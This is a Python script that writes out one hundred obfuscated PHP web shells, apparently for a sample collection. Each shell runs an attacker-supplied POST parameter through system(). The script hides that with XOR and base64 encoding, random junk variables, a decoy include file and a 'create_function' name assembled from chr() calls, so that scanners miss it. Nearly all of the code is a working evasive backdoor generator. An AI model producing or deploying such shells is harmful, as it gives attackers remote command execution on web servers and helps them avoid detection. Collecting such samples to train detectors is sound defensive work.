import os
import random
import base64
import string
from pathlib import Path

OUTPUT_DIR = Path("/data/php_webshellv10")
KEY = "secret"

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def xor_encode(data, key):
    return ''.join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

def xor_encode_base64(data, key):
    xor_bytes = xor_encode(data, key).encode()
    return base64.b64encode(xor_bytes).decode()

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_junk_code():
    lines = []
    for _ in range(random.randint(3, 7)):
        var = generate_random_var()
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 10)))
        lines.append(f"${var} = '{val}';")
    return '\n'.join(lines)

def build_webshell(index):
    php_open = "<?php"
    php_close = "?>"
    
    # 伪装 include 文件
    normal_file_name = f"normal_{index}.php"
    with open(os.path.join(OUTPUT_DIR, normal_file_name), 'w') as f:
        f.write("<?php\n$dummy = 'clean';\n?>")

    # 实际 payload
    payload_code = "$cmd = $_POST['qaxniubi']; system($cmd);"
    encoded_payload = xor_encode_base64(payload_code, KEY)
    
    junk_code = generate_junk_code()
    
    shell = f"""
{php_open}
@include '{normal_file_name}';
{junk_code}
function XORDecode($s, $k) {{
  $o = '';
  for($i=0; $i<strlen($s); $i++) {{
    $o .= chr(ord($s[$i]) ^ ord($k[$i % strlen($k)]));
  }}
  return $o;
}}

$k = '{KEY}';
$p = '{encoded_payload}';
$d = XORDecode(base64_decode($p), $k);

$f1 = chr(99); // c
$f2 = chr(114); // r
$f3 = chr(101); // e
$f4 = chr(97); // a
$f5 = chr(116); // t
$f6 = chr(101); // e
$f7 = chr(95); // _
$f8 = chr(102); // f
$f9 = chr(117); // u
$f10 = chr(110); // n
$f11 = chr(99); // c
$f12 = chr(116); // t
$f13 = chr(105); // i
$f14 = chr(111); // o
$f15 = chr(110); // n
$fn = $f1.$f2.$f3.$f4.$f5.$f6.$f7.$f8.$f9.$f10.$f11.$f12.$f13.$f14.$f15;
$fn('', $d)();
{php_close}
"""
    return shell

def generate_webshell_samples(n):
    for i in range(n):
        shell_code = build_webshell(i)
        path = os.path.join(OUTPUT_DIR, f"adv_webshell_{i}.php")
        with open(path, 'w') as f:
            f.write(shell_code)
    print(f"Generated {n} advanced PHP WebShells in {OUTPUT_DIR}")

def main():
    num_samples = 100
    generate_webshell_samples(num_samples)

if __name__ == "__main__":
    main() 